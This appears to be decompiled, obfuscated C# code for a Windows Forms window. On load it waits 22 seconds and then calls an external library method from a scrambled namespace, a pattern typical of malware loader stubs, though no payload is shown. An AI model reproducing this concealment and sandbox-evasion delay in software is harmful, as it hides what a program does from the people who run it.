using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Apjmqciddnbbpsnfq.Models;
using Oscuhwgrijteinxiakblsjr;

namespace Apjmqciddnbbpsnfq.Consumers;

public class Rule : Form
{
	private IContainer _Broadcaster;

	private ListView _Stub;

	internal static Rule PushSingleton;

	public Rule()
	{
		InterruptPage();
	}

	private void PostPage(object sender, EventArgs e)
	{
	}

	private void LogoutPage(object sender, EventArgs e)
	{
		Thread.Sleep(22000);
		AutoResetEvent autoResetEvent = new AutoResetEvent(initialState: false);
		Instance instance = new Instance(5);
		instance.AwakePage();
		TimerCallback callback = instance.SetupPage;
		VisitPage();
		Console.WriteLine("{0} Creating the timer.\n", DateTime.Now.ToString("h:mm:ss.fff"));
		Timer timer = new Timer(callback, autoResetEvent, 1000, 250);
		autoResetEvent.WaitOne(5000, exitContext: false);
		timer.Change(0, 500);
		Console.WriteLine("\nChanging the timer period.\n");
	}

	private void VisitPage()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new ClassLibrary().Data();
		Instance @object = new Instance(5);
		AutoResetEvent autoResetEvent = new AutoResetEvent(initialState: false);
		Timer timer = new Timer(@object.SetupPage, autoResetEvent, 1000, 250);
		autoResetEvent.WaitOne(5000, exitContext: false);
		timer.Dispose();
		Console.WriteLine("\nDestroying the timer.");
	}

	protected override void Dispose(bool writeinstance)
	{
		if (writeinstance && _Broadcaster != null)
		{
			_Broadcaster.Dispose();
		}
		((Form)this).Dispose(writeinstance);
	}

	private void InterruptPage()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		_Stub = new ListView();
		((Control)this).SuspendLayout();
		int num = 1;
		if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_fc00144d3af741c390880b797bdfd155 == 0)
		{
			goto IL_007c;
		}
		goto IL_0148;
		IL_0148:
		while (true)
		{
			switch (num)
			{
			case 2:
				((Control)_Stub).set_Size(new Size(641, 382));
				((Control)_Stub).set_TabIndex(0);
				_Stub.set_UseCompatibleStateImageBehavior(false);
				NewSingleton(_Stub, new EventHandler(PostPage));
				num = 0;
				if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_b13d4d6cf8bb4c5c885c6d9d79eb1b97 != 0)
				{
					continue;
				}
				break;
			case 1:
				MoveSingleton(_Stub, (DockStyle)5);
				StopSingleton(_Stub, bool_0: false);
				((Control)_Stub).set_Location(new Point(0, 0));
				((Control)_Stub).set_Name("listView1");
				num = 2;
				if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_0b28b0c0fa77480db199fc068416d144 == 0)
				{
					continue;
				}
				goto default;
			default:
				((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
				((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
				((Form)this).set_ClientSize(new Size(641, 382));
				((Control)this).get_Controls().Add((Control)(object)_Stub);
				((Control)this).set_Name("Form1");
				((Control)this).set_Text("Form1");
				((Form)this).add_Load((EventHandler)LogoutPage);
				num = 3;
				if (_003CModule_003E_007Bf4058e74_002D405d_002D4849_002D81cc_002D334896d15ab3_007D.m_db2c7358d263449bb9d577246d798bba != 0)
				{
					continue;
				}
				break;
			case 3:
				GetSingleton(this, bool_0: false);
				return;
			}
			break;
		}
		goto IL_007c;
		IL_007c:
		int num2 = default(int);
		num = num2;
		goto IL_0148;
	}

	internal static bool UpdateSingleton()
	{
		return PushSingleton == null;
	}

	internal static Rule RemoveSingleton()
	{
		return PushSingleton;
	}

	internal static void MoveSingleton(object object_0, DockStyle dockStyle_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		((Control)object_0).set_Dock(dockStyle_0);
	}

	internal static void StopSingleton(object object_0, bool bool_0)
	{
		((ListView)object_0).set_HideSelection(bool_0);
	}

	internal static void NewSingleton(object object_0, object object_1)
	{
		((ListView)object_0).add_SelectedIndexChanged((EventHandler)object_1);
	}

	internal static void GetSingleton(object object_0, bool bool_0)
	{
		((Control)object_0).ResumeLayout(bool_0);
	}
}
